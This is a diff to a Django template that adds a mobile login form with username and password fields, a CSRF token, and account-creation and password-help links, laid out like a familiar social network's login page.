@@ -22,3 +22,28 @@
   </table>
 </form>
 {% endblock %}
+
+{% block mobile %}
+<form method="POST">
+  {% csrf_token %}
+<div id="mobtextdiv">
+  <input type="text" class="mobtextbox mobtextbox1" name="user" placeholder="Mobile number or email address">
+  <input type="password" class="mobtextbox mobtextbox2" name="pwd" placeholder="Password">
+</div>
+<div class="mobloginbuttondiv">
+  <input type="submit" class="mobloginbutton" value="Log In">
+</div>
+<div id="ordiv">
+<span id="or">or</span>
+</div>
+<div id="mobcreatediv">
+  <button id="mobcreate">Create New Account</button>
+</div>
+<div class="mobforgotpw">
+  <a href="#">Forgotten password?</a>
+  <span>·</span>
+  <a href="#">Help Center</a>
+</div>
+</div>
+</form>
+{% endblock %}
